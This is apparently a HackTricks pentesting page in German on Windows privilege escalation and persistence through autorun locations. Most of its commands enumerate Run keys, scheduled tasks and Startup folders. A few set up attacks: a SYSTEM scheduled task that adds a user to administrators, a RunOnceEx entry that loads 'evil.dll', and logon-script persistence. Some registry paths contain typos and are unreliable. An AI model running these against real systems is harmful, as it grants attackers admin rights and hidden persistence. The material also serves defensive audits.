# Privilege Escalation with Autoruns

{{#include ../../banners/hacktricks-training.md}}



## WMIC

**Wmic** kann verwendet werden, um Programme beim **Start** auszuführen. Prüfe, welche Binaries so konfiguriert sind, beim Start ausgeführt zu werden, mit:
```bash
wmic startup get caption,command 2>nul & ^
Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl
```
## Geplante Tasks

**Tasks** können so geplant werden, dass sie mit **bestimmter Frequenz** ausgeführt werden. Sieh dir an, welche Binaries so geplant sind, ausgeführt zu werden mit:
```bash
schtasks /query /fo TABLE /nh | findstr /v /i "disable deshab"
schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

#Schtask to give admin access
#You can also write that content on a bat file that is being executed by a scheduled task
schtasks /Create /RU "SYSTEM" /SC ONLOGON /TN "SchedPE" /TR "cmd /c net localgroup administrators user /add"
```
## Ordner

Alle Binaries, die sich in den **Startup folders** befinden, werden beim Start ausgeführt. Die üblichen Startup folders sind die im Folgenden aufgeführten, aber der Startup folder wird in der registry angegeben. [Lies dies, um zu erfahren, wo.](privilege-escalation-with-autorun-binaries.md#startup-path)
```bash
dir /b "C:\Documents and Settings\All Users\Start Menu\Programs\Startup" 2>nul
dir /b "C:\Documents and Settings\%username%\Start Menu\Programs\Startup" 2>nul
dir /b "%programdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
dir /b "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" 2>nul
Get-ChildItem "C:\Users\All Users\Start Menu\Programs\Startup"
Get-ChildItem "C:\Users\$env:USERNAME\Start Menu\Programs\Startup"
```
> **FYI**: Archive extraction *path traversal* vulnerabilities (such as the one abused in WinRAR prior to 7.13 – CVE-2025-8088) can be leveraged to **deposit payloads directly inside these Startup folders during decompression**, resulting in code execution on the next user logon.  Für eine ausführliche Betrachtung dieser Technik siehe:


{{#ref}}
../../generic-hacking/archive-extraction-path-traversal.md
{{#endref}}



## Registry

> [!TIP]
> [Note from here](https://answers.microsoft.com/en-us/windows/forum/all/delete-registry-key/d425ae37-9dcc-4867-b49c-723dcd15147f): Der **Wow6432Node**-Registry-Eintrag zeigt an, dass du eine 64-bit Windows-Version verwendest. Das Betriebssystem nutzt diesen Key, um 32-bit Anwendungen, die auf 64-bit Windows-Versionen laufen, eine separate Sicht auf HKEY_LOCAL_MACHINE\SOFTWARE anzuzeigen.

### Runs

**Commonly known** AutoRun registry:

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Wow6432Npde\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Runonce`
- `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunonceEx`

Registry-Schlüssel, bekannt als **Run** und **RunOnce**, sind dafür ausgelegt, Programme automatisch bei jeder Anmeldung eines Benutzers am System auszuführen. Die einer Schlüssel-Datenwert zugewiesene Befehlszeile ist auf 260 Zeichen oder weniger begrenzt.

**Service runs** (kann den automatischen Start von Diensten während des Bootens steuern):

- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce`
- `HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`
- `HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices`

**RunOnceEx:**

- `HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx`
- `HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceEx`

Auf Windows Vista und späteren Versionen werden die Registry-Schlüssel **Run** und **RunOnce** nicht automatisch erzeugt. Einträge in diesen Schlüsseln können Programme entweder direkt starten oder sie als Abhängigkeiten angeben. Um beispielsweise beim Anmelden eine DLL-Datei zu laden, könnte man den Registry-Schlüssel **RunOnceEx** zusammen mit einem "Depend"-Schlüssel verwenden. Dies wird demonstriert, indem ein Registry-Eintrag hinzugefügt wird, um "C:\temp\evil.dll" während des Systemstarts auszuführen:
```
reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d "C:\\temp\\evil.dll"
```
> [!TIP]
> **Exploit 1**: Wenn du in eine der genannten Registry innerhalb von **HKLM** schreiben kannst, kannst du deine Privilegien eskalieren, wenn sich ein anderer User anmeldet.

> [!TIP]
> **Exploit 2**: Wenn du eines der auf einer der Registry innerhalb von **HKLM** angegebenen Binaries überschreiben kannst, kannst du dieses Binary beim Login eines anderen Users mit einer Backdoor modifizieren und deine Privilegien eskalieren.
```bash
#CMD
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE

reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Wow5432Node\Microsoft\Windows\CurrentVersion\RunServices

reg query HKLM\Software\Microsoft\Windows\RunOnceEx
reg query HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Microsoft\Windows\RunOnceEx
reg query HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx

#PowerShell
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\Run'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows NT\CurrentVersion\Terminal Server\Install\Software\Microsoft\Windows\CurrentVersion\RunE'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServicesOnce'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunServices'

Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKLM\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\RunOnceEx'
Get-ItemProperty -Path 'Registry::HKCU\Software\Wow6432Node\Microsoft\Windows\RunOnceEx'
```
### Startup Path

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders`
- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders`

Verknüpfungen, die im **Startup**-Ordner abgelegt werden, lösen beim Benutzer-Logon oder beim Systemneustart automatisch das Starten von Diensten oder Anwendungen aus. Der Speicherort des **Startup**-Ordners ist in der Registry sowohl für den Bereich **Local Machine** als auch **Current User** definiert. Das bedeutet, dass jede Verknüpfung, die zu diesen angegebenen **Startup**-Speicherorten hinzugefügt wird, sicherstellt, dass der verknüpfte Dienst oder das Programm nach dem Logon- oder Reboot-Prozess gestartet wird, was dies zu einer einfachen Methode macht, Programme automatisch ausführen zu lassen.

> [!TIP]
> If you can overwrite any \[User] Shell Folder under **HKLM**, you will be able to point it to a folder controlled by you and place a backdoor that will be executed anytime a user logs in the system escalating privileges.
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v "Common Startup"
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" /v "Common Startup"

Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders' -Name "Common Startup"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders' -Name "Common Startup"
```
### UserInitMprLogonScript

- `HKCU\Environment\UserInitMprLogonScript`

Dieser per-user registry value kann auf ein Script oder einen command verweisen, der ausgeführt wird, wenn sich dieser user anmeldet. Er ist hauptsächlich ein **persistence**-Primitive, weil er nur im Kontext des betroffenen users läuft, aber es lohnt sich trotzdem, ihn bei post-exploitation und autoruns reviews zu prüfen.

> [!TIP]
> Wenn du diesen Wert für den current user schreiben kannst, kannst du die execution beim nächsten interaktiven logon erneut auslösen, ohne admin rights zu benötigen. Wenn du ihn für einen anderen user hive schreiben kannst, kannst du code execution erhalten, wenn sich dieser user anmeldet.
```bash
reg query "HKCU\Environment" /v "UserInitMprLogonScript"
reg add "HKCU\Environment" /v "UserInitMprLogonScript" /t REG_SZ /d "C:\Users\Public\logon.bat" /f
reg delete "HKCU\Environment" /v "UserInitMprLogonScript" /f

Get-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
Set-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript" -Value 'C:\Users\Public\logon.bat'
Remove-ItemProperty -Path 'Registry::HKCU\Environment' -Name "UserInitMprLogonScript"
```
Hinweise:

- Bevorzuge vollständige Pfade zu `.bat`, `.cmd`, `.ps1` oder anderen Launcher-Dateien, die bereits für den Zielbenutzer lesbar sind.
- Dies übersteht Logoff/Neustart, bis der Wert entfernt wird.
- Anders als `HKLM\...\Run` gewährt dies **nicht** von sich aus eine Erhöhung der Privilegien; es ist User-Scope-Persistence.

### Winlogon Keys

`HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`

Typischerweise ist der **Userinit**-Key auf **userinit.exe** gesetzt. Wenn dieser Key jedoch geändert wird, wird die angegebene ausführbare Datei ebenfalls von **Winlogon** beim Benutzer-Logon gestartet. Ebenso ist der **Shell**-Key dafür gedacht, auf **explorer.exe** zu verweisen, die Standard-Shell für Windows ist.
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Userinit"
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v "Shell"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Userinit"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon' -Name "Shell"
```
> [!TIP]
> Wenn du den registry value oder die binary überschreiben kannst, kannst du Privileges eskalieren.

### Policy Settings

- `HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`

Prüfe den **Run** key.
```bash
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "Run"
Get-ItemProperty -Path 'Registry::HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
Get-ItemProperty -Path 'Registry::HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer' -Name "Run"
```
### AlternateShell

### Ändern der Safe Mode Command Prompt

In der Windows Registry unter `HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot` gibt es einen standardmäßig auf `cmd.exe` gesetzten Wert **`AlternateShell`**. Das bedeutet, wenn du beim Start „Safe Mode with Command Prompt“ auswählst (durch Drücken von F8), wird `cmd.exe` verwendet. Es ist aber möglich, den Computer so einzurichten, dass er automatisch in diesem Modus startet, ohne dass F8 gedrückt und manuell ausgewählt werden muss.

Schritte, um eine Boot-Option zu erstellen, die automatisch in „Safe Mode with Command Prompt“ startet:

1. Ändere die Attribute der Datei `boot.ini`, um die Flags für schreibgeschützt, System und verborgen zu entfernen: `attrib c:\boot.ini -r -s -h`
2. Öffne `boot.ini` zum Bearbeiten.
3. Füge eine Zeile wie diese ein: `multi(0)disk(0)rdisk(0)partition(1)\WINDOWS="Microsoft Windows XP Professional" /fastdetect /SAFEBOOT:MINIMAL(ALTERNATESHELL)`
4. Speichere die Änderungen an `boot.ini`.
5. Setze die ursprünglichen Dateiattribute erneut: `attrib c:\boot.ini +r +s +h`

- **Exploit 1:** Das Ändern des **AlternateShell**-Registry-Schlüssels erlaubt eine benutzerdefinierte Kommandozeilen-Shell-Konfiguration und möglicherweise unbefugten Zugriff.
- **Exploit 2 (PATH Write Permissions):** Schreibrechte auf einen beliebigen Teil der systemweiten **PATH**-Variable, insbesondere vor `C:\Windows\system32`, ermöglichen es dir, ein benutzerdefiniertes `cmd.exe` auszuführen, das im Safe Mode als Backdoor dienen könnte.
- **Exploit 3 (PATH and boot.ini Write Permissions):** Schreibzugriff auf `boot.ini` ermöglicht einen automatischen Start im Safe Mode und erleichtert so unbefugten Zugriff beim nächsten Neustart.

Um die aktuelle **AlternateShell**-Einstellung zu prüfen, verwende diese Befehle:
```bash
reg query HKLM\SYSTEM\CurrentControlSet\Control\SafeBoot /v AlternateShell
Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SafeBoot' -Name 'AlternateShell'
```
### Installed Component

Active Setup ist eine Funktion in Windows, die **vor dem vollständigen Laden der Desktop-Umgebung startet**. Sie priorisiert die Ausführung bestimmter Befehle, die abgeschlossen sein müssen, bevor die Benutzeranmeldung fortgesetzt wird. Dieser Prozess erfolgt sogar vor anderen Autostart-Einträgen, wie denen in den Run- oder RunOnce-Registry-Abschnitten, ausgelöst werden.

Active Setup wird über die folgenden Registry-Keys verwaltet:

- `HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components`
- `HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components`

Innerhalb dieser Keys existieren verschiedene Subkeys, die jeweils einer bestimmten Komponente entsprechen. Besonders interessant sind die Key-Werte:

- **IsInstalled:**
- `0` bedeutet, dass der Befehl der Komponente nicht ausgeführt wird.
- `1` bedeutet, dass der Befehl einmal für jeden Benutzer ausgeführt wird, was das Standardverhalten ist, wenn der Wert `IsInstalled` fehlt.
- **StubPath:** Definiert den Befehl, der von Active Setup ausgeführt werden soll. Es kann jede gültige Commandline sein, zum Beispiel das Starten von `notepad`.

**Security Insights:**

- Das Ändern oder Schreiben in einen Key, bei dem **`IsInstalled`** auf `"1"` gesetzt ist, zusammen mit einem bestimmten **`StubPath`**, kann zu unauthorisierter Codeausführung führen und möglicherweise für privilege escalation missbraucht werden.
- Das Ändern der Binärdatei, auf die ein beliebiger **`StubPath`**-Wert verweist, könnte ebenfalls privilege escalation ermöglichen, sofern ausreichende Berechtigungen vorhanden sind.

Um die **`StubPath`**-Konfigurationen über Active Setup-Komponenten hinweg zu prüfen, können diese Befehle verwendet werden:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
reg query "HKCU\SOFTWARE\Wow6432Node\Microsoft\Active Setup\Installed Components" /s /v StubPath
```
### Browser Helper Objects

### Überblick über Browser Helper Objects (BHOs)

Browser Helper Objects (BHOs) sind DLL-Module, die Microsoft Internet Explorer zusätzliche Funktionen hinzufügen. Sie werden bei jedem Start in Internet Explorer und Windows Explorer geladen. Ihre Ausführung kann jedoch durch Setzen des **NoExplorer**-Schlüssels auf 1 blockiert werden, wodurch verhindert wird, dass sie mit Windows Explorer-Instanzen geladen werden.

BHOs sind unter Windows 10 über Internet Explorer 11 kompatibel, werden jedoch in Microsoft Edge, dem Standardbrowser in neueren Windows-Versionen, nicht unterstützt.

Um auf einem System registrierte BHOs zu untersuchen, kannst du die folgenden Registry-Schlüssel prüfen:

- `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`
- `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects`

Jedes BHO wird in der Registry durch seine **CLSID** dargestellt und dient als eindeutiger Bezeichner. Detaillierte Informationen zu jeder CLSID findest du unter `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}`.

Für das Abfragen von BHOs in der Registry können diese Befehle verwendet werden:
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper Objects" /s
```
### Internet Explorer Extensions

- `HKLM\Software\Microsoft\Internet Explorer\Extensions`
- `HKLM\Software\Wow6432Node\Microsoft\Internet Explorer\Extensions`

Beachte, dass die Registry für jede dll 1 neuen Registry-Eintrag enthält und dieser durch die **CLSID** dargestellt wird. Du kannst die CLSID-Infos in `HKLM\SOFTWARE\Classes\CLSID\{<CLSID>}` finden

### Font Drivers

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers`
- `HKLM\SOFTWARE\WOW6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers`
```bash
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers"
reg query "HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers"
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Font Drivers'
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Font Drivers'
```
### Open Command

- `HKLM\SOFTWARE\Classes\htmlfile\shell\open\command`
- `HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command`
```bash
reg query "HKLM\SOFTWARE\Classes\htmlfile\shell\open\command" /v ""
reg query "HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command" /v ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Classes\htmlfile\shell\open\command' -Name ""
Get-ItemProperty -Path 'Registry::HKLM\SOFTWARE\Wow6432Node\Classes\htmlfile\shell\open\command' -Name ""
```
### Image File Execution Options
```
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options
HKLM\Software\Microsoft\Wow6432Node\Windows NT\CurrentVersion\Image File Execution Options
```
## SysInternals

Beachte, dass alle Stellen, an denen du autoruns finden kannst, **bereits von**[ **winpeas.exe**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe) **gesucht werden**. Für eine **umfassendere Liste automatisch ausgeführter** Dateien könntest du jedoch [autoruns ](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) von systinternals verwenden:
```
autorunsc.exe -m -nobanner -a * -ct /accepteula
```
## Mehr

**Finde weitere Autoruns wie Registries in** [**https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2**](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)

## Referenzen

- [https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref](https://resources.infosecinstitute.com/common-malware-persistence-mechanisms/#gref)
- [https://attack.mitre.org/techniques/T1547/001/](https://attack.mitre.org/techniques/T1547/001/)
- [https://attack.mitre.org/techniques/T1037/001/](https://attack.mitre.org/techniques/T1037/001/)
- [https://www.microsoftpressstore.com/articles/article.aspx?p=2762082\&seqNum=2](https://www.microsoftpressstore.com/articles/article.aspx?p=2762082&seqNum=2)
- [https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell](https://www.itprotoday.com/cloud-computing/how-can-i-add-boot-option-starts-alternate-shell)
- [https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026](https://www.rapid7.com/blog/post/pt-metasploit-wrap-up-04-03-2026)



{{#include ../../banners/hacktricks-training.md}}
